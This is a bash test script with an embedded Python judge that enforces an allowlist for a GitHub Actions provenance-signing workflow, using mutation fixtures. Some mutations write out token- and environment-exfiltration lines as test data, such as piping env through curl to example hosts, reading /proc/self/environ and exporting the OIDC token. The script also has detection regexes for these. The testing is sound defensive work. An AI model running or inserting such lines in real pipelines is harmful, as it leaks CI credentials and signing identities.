#!/usr/bin/env bash
# proves: REQ-CHAIN-001-AC1, REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-002-AC4, REQ-CHAIN-003-AC5
# The Sign boundary (v0.3.0 rules 50, 50a, 52, 52a, 53a; owner RATIFIED Oct 9), static half. Three judges, each first proven
# on a known-good fixture and on every mutated copy (a judge that cannot fail proves nothing), then applied to the real repo:
#   judge_sign  stage-sign.yml is an ALLOWLIST: a reusable workflow of one job on a GitHub-hosted runner whose only input is
#               `digests`, with no outputs and no secrets, whose steps are exactly, in order:
#                 1. actions/checkout (persist-credentials: false, explicit)
#                 2. actions/download-artifact name witness-build path witness-build (Build's signed Witness record: DATA, never run)
#                 3. run: ./bin/install-scanner.sh cosign        (the signing tool, pinned by checksum like gitsign; the PR adds
#                                                                 cosign to bin/install-scanner.sh)
#                 4. run: printf '%s' "$DIGESTS" > digests.json  (env DIGESTS: ${{ inputs.digests }}, the only env in the job)
#                 5. run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json
#                         --build-record witness-build/build-collection.json --policy .github/policy/release-policy.template.json --out provenance
#                         (the filenames are PINNED: `--policy` names the committed template, from which `sign --check` makes the
#                          per-tag policy with the committed trust file and the tag from GITHUB_REF, rule 57; it verifies Build's
#                          record, compares the digests, THEN signs; the identity token is requested by cosign
#                          inside its own process and no step ever names it)
#                 6. actions/upload-artifact name provenance path provenance
#               Everything else fails closed (rules 52, 52a; 001-AC1..AC3). The four sinks rule 52a names (file, artifact, log,
#               step output) are each a named mutation. QUESTION FOR THE PARENT: cosign (above) or Witness for Sign's signature?
#               Cosign is proposed because the provenance is customer-verifiable and rule 53b needs a Rekor entry, which Witness
#               cannot write (Witness has no Rekor support, rule 53b); the Witness record of Build stays Witness.
#   judge_build 002-AC4: a Build signing step takes nothing from a secret or the job token. Judged when the file has
#               signing steps (stage-build.yml today signs with attest actions and is rewritten in PR 2).
#   judge_tree  001-AC1: stage-sign.yml is the only workflow file added since v0.2.2, and NO other workflow, composite
#               action or .yaml file signs provenance; every other signing call is listed with a reason in
#               .github/policy/chain-signers.json. The old chain files still sign provenance today, so on the real repo
#               this judge is correctly RED until PRs 2-4 remove those steps.
#   (shared)    the signer table bin/chain-test-signers.json is read by this test and by chain-records-test.sh, so the two cannot
#               disagree about what a signer is; comments (full-line and trailing) are stripped before matching, so a trailing
#               `# verify` exempts nothing; every script a workflow runs is scanned too (a signing call hidden in bin/x.sh must be
#               listed in chain-signers.json under that script's path, with a reason); bin/chain-verify.py itself is the one script
#               allowed to contain signing calls (the Sign job's signature), because only `chain-verify.py sign` in stage-sign.yml
#               reaches them (the table makes `chain-verify.py sign` anywhere else a provenance signer).
# Stated exclusions: a signer reached only through an argv array in a github-script/JS file (exec.exec('cosign', ['sign'])) or a binary
# downloaded at run time is not seen by a text table; the Sign job's own allowlist and the dry run cover the Sign side. The engine and
# table are bin/chain-test-signers.py / .json (shared with chain-records-test.sh).
# Needs python3 with PyYAML (apt: python3-yaml).
# Modelled on: this repo's bin/workflow-consolidation-test.sh (judge + mutation pattern); in-toto-witness docs/commands.md
# (witness run / sign flags) and docs/attestors/slsa.md for the signing-call patterns.
# Round 10 (Sonnet R5, Opus R5): the script scan has NO variable resolution and NO heredoc stripping. A script called through $VAR,
# ${VAR}, $(cmd) or backticks is an ERROR naming the workflow or script (call scripts by literal path); a heredoc body is scanned as
# code like any other text (a signer word inside heredoc DATA is flagged: list it with a reason in chain-signers.json). Static
# resolution of shell is an unbounded class (rounds 4-9 each found another plain form), so it is closed by deletion.
# On the real tree exactly one scan error remains today: bin/analyze-egress-trace-test.sh ($CHK), reached from
# stage-acceptance-egress.yml as well as ci.yml; that red clears when PR 3 removes that stage file (no unrelated script is edited).
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
cat > "$work/judge.py" <<'PY'
import glob, json, os, re, sys, yaml
SHA = r"[0-9a-f]{40}"
TOKEN = r"ACTIONS_ID_TOKEN|ACTIONS_RUNTIME|id-token|getIDToken|oidc|/proc/\S*environ|\bprintenv\b|\benv\b\s*(\||>|$)|\bset\s+-\w*x"
def load(path):
    return yaml.load(open(path).read(), Loader=yaml.BaseLoader), open(path).read()

sys.path.insert(0, os.path.join(os.environ["CHAIN_ROOT"], "bin"))
import importlib.util
_spec = importlib.util.spec_from_file_location("chain_test_signers", os.path.join(os.environ["CHAIN_ROOT"], "bin/chain-test-signers.py"))
_cts = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(_cts)
TABLE = _cts.load_table()
strip, logical = _cts.strip, _cts.logical
def signer_calls(text): return _cts.signer_calls(text, TABLE)

R_PRINTF = r"printf '%s' \"\$DIGESTS\" > digests\.json"
R_INSTALL = r"\./bin/install-scanner\.sh cosign"
R_SIGN = r"python3 bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --build-record witness-build/build-collection\.json --policy \.github/policy/release-policy\.template\.json --out provenance"
def judge_sign(path):
    if not os.path.exists(path): return ["missing: " + path]
    d, text = load(path); bad = []
    extra_top = set(d) - {"name", "on", "permissions", "jobs"}
    if extra_top: bad.append("AC3: top-level keys %s are not allowed (defaults.run.shell, concurrency, run-name, env can reroute every run step)" % sorted(extra_top))
    on = d.get("on")
    if not isinstance(on, dict) or set(on) != {"workflow_call"}:
        bad.append("AC1: on: must be exactly workflow_call: %s" % on)
    call = (on or {}).get("workflow_call") or {} if isinstance(on, dict) else {}
    inputs = call.get("inputs") or {}
    if set(inputs) != {"digests"} or (inputs.get("digests") or {}).get("type") != "string":
        bad.append("AC2: the only input must be `digests` (string), found %s" % sorted(inputs))
    if call.get("secrets"): bad.append("AC3: the workflow declares secrets")
    if call.get("outputs"): bad.append("AC3 (step output sink): workflow_call outputs are not allowed")
    if d.get("env"): bad.append("AC3: workflow-level env is not allowed")
    if re.search(r"secrets\b|toJSON|\bcontext\b", text): bad.append("AC3/002-AC4: secrets, toJSON or context appear in the file")
    jobs = d.get("jobs") or {}
    if len(jobs) != 1: bad.append("AC1: exactly one job required, found %d" % len(jobs))
    for name, j in jobs.items():
        ro = j.get("runs-on")
        if not isinstance(ro, str) or not re.fullmatch(r"ubuntu-[0-9.]+(-arm)?|ubuntu-latest", ro):
            bad.append("AC1: job %s must run on a GitHub-hosted ubuntu runner, got %r" % (name, ro))
        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "if", "secrets"):
            if k in j: bad.append("AC2/AC3: job %s has `%s`, which Sign's job must not have" % (name, k))
        perm = j.get("permissions")
        if not isinstance(perm, dict) or perm.get("id-token") != "write" or any(v == "write" for k, v in perm.items() if k != "id-token"):
            bad.append("AC3: Sign's permissions must be id-token: write and no other write: %s" % perm)
        order = []
        for s in j.get("steps") or []:
            sn = s.get("name") or s.get("uses") or s.get("run")
            extra = set(s) - {"name", "uses", "with", "run", "env", "id"}
            if extra: bad.append("AC2: step %r has %s" % (sn, sorted(extra)))
            u, w, run, env = s.get("uses"), s.get("with") or {}, s.get("run"), s.get("env") or {}
            if (u is None) == (run is None): bad.append("AC2: step %r must have exactly one of uses/run" % sn); continue
            if u is not None and env: bad.append("AC3: step %r passes env to an action" % sn)
            if u is not None:
                m = re.fullmatch(r"(actions/[a-z-]+)@(%s)( #.*)?" % SHA, u)
                if not m: bad.append("AC2: step %r uses %r; only a pinned actions/checkout, download-artifact or upload-artifact" % (sn, u)); continue
                act = m.group(1)
                if act == "actions/checkout":
                    order.append("checkout")
                    if set(w) - {"persist-credentials", "fetch-depth"} or w.get("persist-credentials") != "false":
                        bad.append("AC3: checkout must say persist-credentials: false explicitly (the default writes the job token into .git/config): %s" % w)
                elif act == "actions/download-artifact":
                    order.append("download")
                    if w.get("name") != "witness-build" or set(w) - {"name", "path"} or w.get("path", "witness-build") != "witness-build":
                        bad.append("AC2: step %r downloads %s; only the artifact witness-build into witness-build (data, never run)" % (sn, w))
                elif act == "actions/upload-artifact":
                    order.append("upload")
                    if w.get("path") != "provenance" or w.get("name") != "provenance" or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
                        bad.append("AC3 (artifact sink): step %r uploads %s; only the path `provenance` (name provenance) may leave Sign" % (sn, w))
                else:
                    bad.append("AC2: step %r uses %s, which Sign may not" % (sn, act))
            else:
                line = run.strip()
                if "\n" not in line and re.fullmatch(R_PRINTF, line):
                    order.append("printf")
                    if env != {"DIGESTS": "${{ inputs.digests }}"}: bad.append("AC3: the digests step must have exactly env DIGESTS: ${{ inputs.digests }}, found %s" % env)
                elif "\n" not in line and re.fullmatch(R_INSTALL, line):
                    order.append("install")
                    if env: bad.append("AC3: step %r passes env" % sn)
                elif "\n" not in line and re.fullmatch(R_SIGN, line):
                    order.append("sign")
                    if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
                else:
                    sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the three allowed command lines (install cosign; write digests.json from env; chain-verify.py sign --check ... --out provenance)"
                    bad.append("AC2/AC3: run step %r %s" % (sn, why))
                if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
        want = ["checkout", "download", "install", "printf", "sign", "upload"]
        if order != want: bad.append("AC2: Sign's steps must be exactly %s in that order (the check-then-sign step is the only signer), found %s" % (want, order))
    return bad

def judge_build(path):
    if not os.path.exists(path): return []
    d, text = load(path); bad = []
    wf_env = d.get("env") or {}
    for jn, j in (d.get("jobs") or {}).items():
        steps = j.get("steps") or []
        signs = [s for s in steps if signer_calls(yaml.dump(s, width=10**6))]
        if not signs: continue
        job_blob = yaml.dump([j.get("env") or {}, j.get("secrets") or {}, wf_env], width=10**6)
        if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", job_blob) or j.get("environment") or j.get("secrets"):
            bad.append("002-AC4: job %s has signing steps and job/workflow-level env, secrets or an environment that can hand a secret to them" % jn)
        for s in steps:
            if re.search(r"GITHUB_ENV", str(s.get("run") or "")) and re.search(r"secrets\.|github\.token|toJSON|ACTIONS_ID_TOKEN|\$\{\{", str(s.get("run") or "") + yaml.dump(s.get("env") or {}, width=10**6)):
                bad.append("002-AC4: job %s writes a secret or token into GITHUB_ENV in a job that signs" % jn)
        for s in signs:
            blob = yaml.dump(s, width=10**6); nm = s.get("name") or s.get("uses")
            if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", blob):
                bad.append("002-AC4: signing step %r takes a secret or the job token" % nm)
            for fm in re.finditer(r"--(annotation|certificate-[a-z-]+|oidc-[a-z-]+|fulcio-oidc-client-id|signer-fulcio-[a-z-]+)[ =]+\S*\$\{\{", blob):
                bad.append("002-AC4: signing step %r puts an expression into %s" % (nm, fm.group(1)))
    return bad

def judge_tree(base):
    bad = []
    known = set("""acceptance.yml agent-review-gate.yml auditor.yml ci.yml codeql.yml dependabot-auto-merge.yml dependabot-reviewer.yml
go-freshness.yml main-candidate-rescan.yml release.yml reserved-branch-guard.yml scan.yml scorecard.yml
stage-acceptance-artifacts.yml stage-acceptance-egress.yml stage-acceptance-k8s.yml stage-acceptance-predicate.yml
stage-admission.yml stage-authorize.yml stage-build.yml stage-image.yml stage-promote.yml stage-reproducibility.yml
stage-verify.yml supply-chain.yml""".split())
    wfdir = os.path.join(base, ".github/workflows")
    files = sorted(glob.glob(wfdir + "/*.yml") + glob.glob(wfdir + "/*.yaml"))
    new = sorted(os.path.basename(f) for f in files if os.path.basename(f) not in known)
    if new != ["stage-sign.yml"]: bad.append("AC1: workflow files added since v0.2.2 must be exactly [stage-sign.yml], found %s" % new)
    allowed = {}
    sf = os.path.join(base, ".github/policy/chain-signers.json")
    if not os.path.exists(sf): bad.append("AC1: missing .github/policy/chain-signers.json (the signing calls other than Sign's provenance, each with a reason)")
    else:
        for r in json.load(open(sf)).get("signers") or []:
            if not str(r.get("reason") or "").strip(): bad.append("AC1: signer row without a reason: %s" % r)
            if any(pv for e in TABLE if re.search(e["regex"], str(r.get("tool", ""))) for pv in [e["prov"] == "always"]): bad.append("AC1: signer list names a provenance signer: %s" % r)
            allowed.setdefault(r.get("file"), set()).add(r.get("tool"))
    acts = glob.glob(os.path.join(base, ".github/actions/**/action.y*ml"), recursive=True) + glob.glob(os.path.join(base, "action.y*ml"))
    def check(rel, text, who):
        for e, pv, line in signer_calls(text):
            if rel == "stage-sign.yml": continue
            if pv:
                bad.append("AC1: %s%s signs provenance (%s: %s); only stage-sign.yml may" % (rel, who, e["name"], line[:80]))
            elif e["name"] not in allowed.get(rel, set()):
                bad.append("AC1: %s%s calls %r, which is not listed with a reason in chain-signers.json" % (rel, who, e["name"]))
    texts = {}
    for f in files + sorted(acts):
        rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
        text = open(f).read(); texts[os.path.relpath(f, base)] = text
        check(rel, text, "")
    # SF-C (Opus r5): the test-script carve-out in the script scan is safe ONLY because ci.yml can neither mint a Sigstore identity nor
    # hold a signing secret; pin both, so a later ci.yml edit cannot silently widen the carve-out
    cip = os.path.join(base, ".github/workflows/ci.yml")
    if os.path.exists(cip):
        ci = open(cip).read()
        if re.search(r"id-token\s*:\s*write", ci): bad.append("AC1: ci.yml grants id-token: write; the test-script carve-out is only safe while ci.yml cannot mint an identity")
        for m in re.finditer(r"secrets\.(\w+)", ci):
            if re.search(r"SIGN|COSIGN|APK|RELEASE|GPG|REKOR|FULCIO|SIGSTORE", m.group(1), re.I):
                bad.append("AC1: ci.yml passes the signing secret %s to a step; the test-script carve-out is only safe while ci.yml holds none" % m.group(1))
    scripts, serrs = _cts.reachable_scripts(base, texts)
    for x in serrs: bad.append("AC1: unresolved script reference (fail closed): " + x)
    for sp, by in sorted(scripts.items()):
        if sp == "bin/chain-verify.py": continue
        check(sp, open(os.path.join(base, sp), errors="replace").read(), " (run by %s)" % ", ".join(sorted(by)))
    return bad

def judge_calls(root):
    """REQ-CHAIN-003-AC5 (pipeline reading, advisor to confirm): a certificate's SAN is the file that runs the witness step
    (harness spike (b), case 5: a stage that calls another stage's file gets that file's SAN). So only release.yml may call
    stage-sign.yml and no stage file may call another stage file; other workflows (scan.yml, main-candidate-rescan.yml) may
    still call stage-build.yml / stage-image.yml, because the release policy pins the Build Config URI (release.yml at the tag)."""
    bad = []
    wd = os.path.join(root, ".github/workflows")
    for fn in sorted(os.listdir(wd)):
        if not fn.endswith((".yml", ".yaml")) or fn == "release.yml": continue
        try: d = yaml.load(open(os.path.join(wd, fn)).read(), Loader=yaml.BaseLoader) or {}
        except Exception as e: bad.append("AC5: %s does not parse (%s)" % (fn, e)); continue
        for jn, j in (d.get("jobs") or {}).items():
            refs = [str(j.get("uses", ""))] + [str(s.get("uses", "")) for s in (j.get("steps") or [])]
            for r in refs:
                if re.search(r"\.github/workflows/stage-sign\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; only release.yml may call stage-sign.yml" % (fn, jn, r))
                elif fn.startswith("stage-") and re.search(r"\.github/workflows/stage-[^@\s]*\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; a stage file may not call another stage file" % (fn, jn, r))
    return bad

if __name__ == "__main__":
    which, arg = sys.argv[1], sys.argv[2]
    bad = {"sign": judge_sign, "build": judge_build, "tree": judge_tree, "calls": judge_calls}[which](arg)
    print("; ".join(dict.fromkeys(bad)) or "ok"); sys.exit(1 if bad else 0)
PY
export CHAIN_SIGNER_TABLE="$root/bin/chain-test-signers.json" CHAIN_ROOT="$root"
judge() { python3 "$work/judge.py" "$@"; }
expect() { # expect ok|caught LABEL judge ARG
  local out rc=0
  out=$(judge "$3" "$4") || rc=$?
  if [ "$1" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   $2"
  elif [ "$1" = caught ] && [ "$rc" != 0 ]; then pass=$((pass + 1)); echo "ok   $2 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $2 -> ${out:0:500}"; fi
}
expect_has() { # expect_has LABEL judge ARG NEEDLE : the judge fails AND its message contains NEEDLE (so the intended check, not another, fired)
  local out rc=0
  out=$(judge "$2" "$3") || rc=$?
  if [ "$rc" != 0 ] && printf '%s' "$out" | grep -qF -- "$4"; then pass=$((pass + 1)); echo "ok   $1 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $1 -> rc=$rc, message lacks '$4': ${out:0:400}"; fi
}
sha=$(printf 'a%.0s' $(seq 40))
good="$work/good.yml"
cat > "$good" <<EOF
name: 'Stage: sign'
on:
  workflow_call:
    inputs:
      digests:
        description: 'JSON of the digests Build produced'
        required: true
        type: string
permissions:
  contents: read
jobs:
  sign:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@$sha # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/download-artifact@$sha # v8
        with:
          name: witness-build
          path: witness-build
      - name: install the signing tool (pinned by checksum)
        run: ./bin/install-scanner.sh cosign
      - name: write the digest list to a file
        env:
          DIGESTS: \${{ inputs.digests }}
        run: printf '%s' "\$DIGESTS" > digests.json
      - name: check Build's record, compare the digests, then sign the provenance
        run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --policy .github/policy/release-policy.template.json --out provenance
      - uses: actions/upload-artifact@$sha # v7
        with:
          name: provenance
          path: provenance
EOF
# mutate LABEL  python-regex  replacement : writes $work/LABEL.yml, or counts a FAILURE if the mutation did not apply
mutate() {
  python3 - "$good" "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml" "$2" "$3" <<'PY' || { failn=$((failn + 1)); echo "FAIL mutation $1 did not apply to the fixture"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], lambda m: sys.argv[4].replace("\\n", "\n").replace("\\t", "\t"), t, count=1, flags=re.S)
if n == t: sys.exit(1)
open(sys.argv[2], "w").write(n)
PY
}
caught() { # LABEL regex replacement
  if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
}
SIGNLINE='run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --policy .github/policy/release-policy.template.json --out provenance'
expect ok "fixture: known-good Sign passes the judge" sign "$good"
caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
caught "AC2 fetches build output with gh" "$SIGNLINE" 'run: gh run download 1 -D dist'
caught "AC2 runs a build output" "$SIGNLINE" 'run: bash dist/run.sh'
caught "AC2 interpolates the input into the shell" 'run: printf .%s. "\$DIGESTS" > digests.json' "run: printf '%s' '\${{ inputs.digests }}' > digests.json"
caught "AC2 two commands in one run step" "out provenance" 'out provenance; curl https://example.com'
caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
caught "AC2 the Sign step does not check (no --check)" ' --check' ''
caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verify.py sign --check --signer cosign' 'chain-verify.py verify --record witness-build/build-collection.json #'
caught "AC2 the Sign step has no Build record" ' --build-record witness-build/build-collection.json' ''
caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
caught "AC2 the signing tool is not installed from the pinned installer" 'run: ./bin/install-scanner.sh cosign' 'run: curl -sL https://example.com/cosign -o cosign'
caught "AC2 the signing step runs before the tool is installed" '      - name: install the signing tool \(pinned by checksum\)\n        run: ./bin/install-scanner.sh cosign\n' ''
caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --policy .github/policy/release-policy.template.json --out provenance"
caught "AC2 a permissive policy file instead of the template" 'release-policy.template.json' 'permissive.json'
caught "AC2 a different Build record file name" 'witness-build/build-collection.json' 'witness-build/other.json'
caught "AC2 the policy argument points outside .github/policy" '--policy .github/policy/release-policy.template.json' '--policy /tmp/p.json'
caught "AC3 checkout without persist-credentials: false" '        with:\n          persist-credentials: false\n' ''
caught "AC3 checkout with persist-credentials: true" 'persist-credentials: false' 'persist-credentials: true'
caught "AC3 secret reference" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          K: ${{ secrets.KEY }}'
caught "AC3 toJSON(secrets)" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ toJSON(secrets) }}'
caught "AC3 job token passed in env" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          T: ${{ github.token }}'
caught "AC3 env on the signing step" "      - name: check Build's record" "      - env:\n          X: y\n        name: check Build's record"
caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
caught "AC3 sink step output: token to GITHUB_OUTPUT" "$SIGNLINE" 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT"'
caught "AC3 sink file: token to a file" "$SIGNLINE" 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"'
caught "AC3 sink log: token echoed" "$SIGNLINE" 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
caught "AC3 sink log: whole environment dumped (printenv)" "$SIGNLINE" 'run: printenv'
caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" 'run: env | curl -d @- https://example.com'
caught "AC3 sink file: /proc/self/environ" "$SIGNLINE" 'run: cat /proc/self/environ'
caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
caught "AC3 sink artifact: upload a second artifact" "          path: provenance" "          path: provenance\n      - uses: actions/upload-pages-artifact@$sha\n        with:\n          path: ."
caught "AC3 extra write permission" 'id-token: write' 'id-token: write\n      packages: write'
caught "AC3 no id-token" 'id-token: write' 'id-token: none'
# 002-AC4: Build's signing steps (the judge runs on a fixture here, and on the real stage-build.yml when it exists)
cat > "$work/build-good.yml" <<EOF
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - name: Witness-wrapped build
        run: witness run --step build --signer-fulcio-url https://fulcio.sigstore.dev -- ./bin/build.sh
EOF
expect ok "fixture: a Build signing step with no secret passes" build "$work/build-good.yml"
sed 's#witness run#witness run --signer-fulcio-oidc-client-id ${{ inputs.cid }}#' "$work/build-good.yml" > "$work/build-expr.yml"
expect caught "002-AC4 an expression in a certificate/OIDC flag" build "$work/build-expr.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          K: ${{ secrets.KEY }}' > "$work/build-sec.yml"
expect caught "002-AC4 a secret in a signing step" build "$work/build-sec.yml"
printf '%s\n' "$(cat "$work/build-good.yml")" '        env:' '          T: ${{ github.token }}' > "$work/build-tok.yml"
expect caught "002-AC4 the job token in a signing step" build "$work/build-tok.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    env:" '      K: ${{ secrets.KEY }}' "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-jobenv.yml"
expect caught "002-AC4 a secret in the JOB-level env of a job that signs" build "$work/build-jobenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    environment: release" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-environment.yml"
expect caught "002-AC4 a job that signs runs in a GitHub environment (environment secrets)" build "$work/build-environment.yml"
printf '%s\n' "env:" '  K: ${{ secrets.KEY }}' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-wfenv.yml"
expect caught "002-AC4 a secret in the WORKFLOW-level env of a file that signs" build "$work/build-wfenv.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - name: long line" "        run: echo start && echo a-very-long-prefix-that-forces-a-yaml-dump-to-wrap-the-line-at-eighty-columns-xxxxxxxxxxxxxxxxxxxx && witness run --step build -- ./bin/build.sh" "        env:" '          K: ${{ secrets.KEY }}' > "$work/build-wrap.yml"
expect caught "002-AC4 a secret in a signing step whose command line is long enough for yaml.dump to wrap" build "$work/build-wrap.yml"
printf '%s\n' "jobs:" "  build:" "    runs-on: ubuntu-24.04" "    steps:" "      - run: echo \"K=\${{ secrets.KEY }}\" >> \"\$GITHUB_ENV\"" "      - run: witness run --step build -- ./bin/build.sh" > "$work/build-ghenv.yml"
expect caught "002-AC4 a secret written to GITHUB_ENV by an earlier step of a job that signs" build "$work/build-ghenv.yml"
# 001-AC1: the tree judge on a fixture tree
mk() {
  local d="$work/$1"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
  for f in acceptance auditor ci release stage-build stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
  cp "$good" "$d/.github/workflows/stage-sign.yml"
  printf '#!/usr/bin/env bash\n' > "$d/bin/build.sh"; printf '#!/usr/bin/env bash\n' > "$d/bin/install-scanner.sh"
  printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
  printf 'jobs:\n  d:\n    steps:\n      - run: git -c gpg.x509.program=gitsign tag -s v1\n' > "$d/.github/workflows/release.yml"
  printf '{"signers":[{"file":"stage-build.yml","tool":"witness run","reason":"Build'"'"'s own Witness collection (rule 51)"},{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
  echo "$d"
}
expect ok "fixture tree: only Sign signs provenance, other signers listed with a reason" tree "$(mk t_good)"
d=$(mk t_prov); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-build-provenance@%s\n' "$sha" > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 another stage signs provenance with the attest action" tree "$d"
for form in '-a slsa' '-a=slsa' '-a product,slsa' '--attestations slsa' '--attestations=slsa' '--attestor slsa'; do
  d=$(mk "t_slsa_$(printf '%s' "$form" | tr -c 'a-z' _)"); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build %s -- ./bin/build.sh\n' "$form" > "$d/.github/workflows/stage-build.yml"
  expect caught "AC1 another stage signs provenance with Witness ($form)" tree "$d"
done
d=$(mk t_slsa_cont); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build \\\n            -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 Witness slsa attestor on a continuation line" tree "$d"
d=$(mk t_cosprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign attest of SLSA provenance in another stage" tree "$d"
d=$(mk t_comment_exempt); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG" # verify\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 a trailing '# verify' exempts nothing" tree "$d"
d=$(mk t_cvsign); printf 'jobs:\n  b:\n    steps:\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record b.json --policy p.json --out provenance\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 chain-verify.py sign anywhere but stage-sign.yml is a second provenance signer" tree "$d"
d=$(mk t_sbom); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-sbom@%s # v3\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 actions/attest-sbom is a known signer and must be listed (not provenance, but not free)" tree "$d"
